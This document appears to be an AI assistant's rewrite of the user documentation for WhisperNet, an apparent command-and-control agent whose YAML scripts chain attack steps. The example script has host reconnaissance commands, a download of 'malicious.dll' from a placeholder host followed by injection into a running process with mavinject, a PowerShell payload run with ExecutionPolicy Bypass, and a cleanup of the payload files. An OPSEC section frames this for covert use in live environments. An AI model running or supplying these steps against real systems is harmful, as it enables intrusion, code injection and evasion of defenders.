Here's an updated version of the documentation that includes the **new format and behavior** while keeping it **high-level and user-friendly**:  

---

# **Command Extension Scripts**

WhisperNet allows you to extend commands using a **YAML-based** scripting system. This provides a structured way to define automated, multi-step actions that can be executed sequentially.

Think of it as a **macro-style automation system**—you define a command, list its steps, and WhisperNet handles execution.

**Dev Note**: This scripting approach is mostly due to my lazyness, rather than hardcoding every possible command into the agent, a minimal set of core commands is supported, and these scripts provide the flexibility to extend and adapt them as needed.

---

## **Example Script**
```yaml
commands:
  - name: recon
    description: "Gather system information"
    steps:
      - action: shell
        args: ["whoami /all"]

      - action: shell
        args: ["ipconfig /all"]

      - action: shell
        args: ["netstat -ano"]

  - name: mav_inject_dll
    description: "Download and inject a DLL into a running process"
    steps:
      - action: sleep
        args: [1]

      - action: get_file
        args: ["http://someip/malicious.dll", "C:\\malicious.dll"]

      - action: start-process
        args: ["mavinject", "<PID>", "/INJECTRUNNING", "C:\\malicious.dll"]

      - action: sleep
        args: [60]

  - name: deploy_payload
    description: "Upload and execute a payload"
    steps:
      - action: upload
        args: ["C:\\temp\\payload.bin", "/var/www/html/payload.bin"]

      - action: shell
        args: ["powershell -ExecutionPolicy Bypass -File C:\\temp\\payload.ps1"]

  - name: clean_up
    description: "Remove temporary files"
    steps:
      - action: shell
        args: ["del /Q C:\\temp\\payload.bin"]

      - action: shell
        args: ["del /Q C:\\temp\\payload.ps1"]
```

---

## **What’s New?**
✅ **Standardized Command Format:**  
- Each command now includes a **name**, **description**, and a list of **steps**.  

✅ **Step-Based Execution:**  
- Instead of grouping actions under a single command, each **step** is treated as an independent execution unit.  

✅ **Arguments are Cleaner:**  
- Arguments are now defined as **lists**, ensuring they’re correctly handled across different execution environments.  

✅ **Commands Are Fully Dynamic:**  
- Each step is processed **individually**, meaning commands can be **logged, modified, or even re-ordered** before execution.  

---

## **How It Works**
1. **Each command** in the script has a name and description.  
2. **Each step** within a command defines an **action** and **arguments**.  
3. When executed, WhisperNet **processes steps one at a time**, ensuring reliability and flexibility.  
4. Arguments are automatically **formatted** before execution (e.g., `"get_file http://someip/malicious.dll C:\\malicious.dll"`).  

---

## **Operational & OPSEC Considerations**
- **Script Changes Are Instant**  
  - You don’t need to restart anything—modifying the YAML script applies changes **immediately** on the next execution.  

- **Minimal OPSEC Footprint for the Script Itself**  
  - The script itself has no impact on OPSEC. However, the **commands inside** will affect OPSEC based on how they’re executed.  

- **Safer Execution Flow**  
  - By processing each **step separately**, you gain better control over execution—allowing for **logging, monitoring, and debugging** before running high-risk commands.  

---

## **Why Use This?**
🚀 **Faster Workflow** – Automate common recon, execution, and cleanup steps.  
⚡ **Dynamic Control** – Modify scripts in real-time without restarting processes.  
🔧 **Modular & Expandable** – Easily add new commands and steps as needed.  
🔒 **More OPSEC-Aware** – Provides better visibility into what’s running at each step.  

---

This updated system makes **command execution more structured, flexible, and safer to use in live environments** while ensuring WhisperNet remains **dynamic and adaptable**. 